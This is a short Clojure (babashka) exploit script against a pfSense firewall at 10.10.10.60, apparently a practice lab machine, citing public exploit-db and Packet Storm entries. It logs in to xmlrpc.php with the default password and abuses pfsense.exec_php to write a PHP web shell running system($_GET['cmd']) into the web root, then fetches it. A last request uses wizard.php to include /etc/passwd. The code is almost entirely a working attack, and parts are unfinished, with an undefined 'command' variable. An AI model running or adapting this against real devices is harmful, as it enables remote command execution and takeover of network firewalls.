(require '[babashka.curl :as curl])
(require '[babashka.process :as process])
(require '[clojure.java.codec :as codec])

(comment
  "https://www.exploit-db.com/exploits/39709"
  "https://packetstormsecurity.com/files/154587/pfSense-2.3.4-2.4.4-p3-Remote-Code-Injection.html")

(def RHOST 
  ;;(str "https://" (System/getenv "RHOST"))
  (str "https://" "10.10.10.60"))

(def PASSWORD "pfsense")

;; --- Stage 1 ---
(def stage-1-resp 
  (curl/post (str RHOST "/xmlrpc.php")
             {:insecure true
              :raw-args ["--insecure"]
              :body (str "<?xml version='1.0' encoding='iso-8859-1'?>"
                         "<methodCall>"
                         "<methodName>pfsense.host_firmware_version</methodName>"
                         "<params>"
                         "<param><value><string>" PASSWORD "</string></value></param>"
                         "</params>"
                         "</methodCall>")}))
stage-1-resp

;; --- Stage 2 ---

(def random_string "alkjfdllldsaf")

(def resp2
  (curl/post (str RHOST "/xmlrpc.php")
             {:insecure true
              :raw-args ["--insecure"]
              :body (str "<?xml version='1.0' encoding='iso-8859-1'?>"
                         "<methodCall>"
                         "<methodName>pfsense.exec_php</methodName>"
                         "<params>"
                         "<param><value><string>" PASSWORD "</string></value></param>"
                         "<param><value><string>"
                         "exec('echo \\'<pre> <?php $res = system($_GET[\"cmd\"]); echo $res ?> </pre>\\' > /usr/local/www/"
                         random_string ".php');</string></value></param>"
                         "</params>"
                         "</methodCall>")}))

resp2

(def final (str RHOST "/" random_string ".php"))

(def check 
  (curl/get (str RHOST "/" random_string ".php")
            {:raw-args ["--insecure"]}))

(comment command)

(curl/post (str RHOST "/xmlrpc.php")
           {:data command
            :headers {"Content-Type" "application/xml"}
            :insecure true})

(def resp3 
  (curl/get 
   (str RHOST "/wizard.php?xml="
        "<?xml version=\" 1.0 \" encoding=\"utf-8\" ?><pfsensewizard><totalsteps>12</totalsteps><step><id>1</id><title>LFI example </title><description>Lfi example </description><disableheader>on</disableheader><stepsubmitphpaction>step1_submitphpaction();</stepsubmitphpaction><includefile>/etc/passwd</includefile></step></pfsensewizard>")))

